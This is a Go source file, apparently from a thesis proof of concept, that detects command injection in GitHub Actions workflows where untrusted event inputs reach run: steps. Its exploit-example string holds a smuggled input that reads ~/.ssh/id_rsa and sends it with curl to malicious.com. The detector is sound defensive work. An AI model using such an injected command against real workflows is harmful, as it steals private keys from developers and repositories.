package analyzer

import (
	"regexp"
	"strings"

	"github.com/cmalvaceda/tesis-poc/pkg/models"
)

// CommandInjectionDetector detecta posibles inyecciones de comandos
type CommandInjectionDetector struct{}

// NewCommandInjectionDetector crea un nuevo detector de inyección de comandos
func NewCommandInjectionDetector() *CommandInjectionDetector {
	return &CommandInjectionDetector{}
}

// Detect implementa la interfaz Detector
func (d *CommandInjectionDetector) Detect(filePath string, lines []string, workflowData map[string]interface{}) []models.Vulnerability {
	var vulnerabilities []models.Vulnerability

	// Patrones revisados para detectar uso inseguro de inputs en comandos
	unsafeInputPattern := regexp.MustCompile(`run:.*\$\{\{\s*github\.event\.(issue|pull_request|comment|discussion|review|head_ref|inputs|client_payload)\..*\s*\}\}`)

	// Casos particularmente riesgosos: inputs directos y client_payload
	highRiskPattern := regexp.MustCompile(`run:.*\$\{\{\s*github\.event\.(inputs|client_payload)\..*\s*\}\}`)

	for i, line := range lines {
		if unsafeInputPattern.MatchString(line) && !strings.Contains(line, "${{ github.event.repository") {
			vulnDetails := line
			severity := string(models.SeverityMedium)

			// Evaluar si es un caso de alto riesgo
			if highRiskPattern.MatchString(line) {
				severity = string(models.SeverityHigh)
			}

			// Evitar falsos positivos cuando hay verificación de inputs o están escapados
			if strings.Contains(line, "||") || strings.Contains(line, "&&") ||
				strings.Contains(line, "\"${{") || strings.Contains(line, "'${{") {
				continue
			}

			impact := "Un atacante podría inyectar comandos arbitrarios que se ejecutarían en el contexto del workflow, " +
				"potencialmente comprometiendo secretos, modificando el repositorio o pivotando a otros sistemas."

			exploit := "Ejemplo de explotación: si el workflow usa `run: echo ${{ github.event.inputs.parameter }}`, " +
				"un atacante podría proporcionar como input: `harmless && curl -d \"$(cat ~/.ssh/id_rsa)\" https://malicious.com`. " +
				"Esto ejecutaría el comando malicioso después del comando legítimo."

			vulnerabilities = append(vulnerabilities, models.Vulnerability{
				Type:        string(models.CommandInjection),
				Description: "Posible inyección de comandos a través de inputs no sanitizados",
				Severity:    severity,
				File:        filePath,
				Line:        i + 1,
				Details:     vulnDetails,
				Impact:      impact,
				Exploit:     exploit,
				Mitigation: "1. Validar y sanitizar estrictamente los inputs antes de usarlos\n" +
					"2. Evitar pasar inputs directamente a comandos shell\n" +
					"3. Usar GitHub Actions inputs con opción 'default' y validación 'required'\n" +
					"4. Considerar el uso de una acción dedicada en lugar de scripts shell para operaciones críticas",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections",
					"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
					"https://github.com/marketplace/actions/create-json-payload - Para manipular datos de forma segura",
					"https://owasp.org/www-community/attacks/Command_Injection",
				},
			})
		}
	}

	return vulnerabilities
}
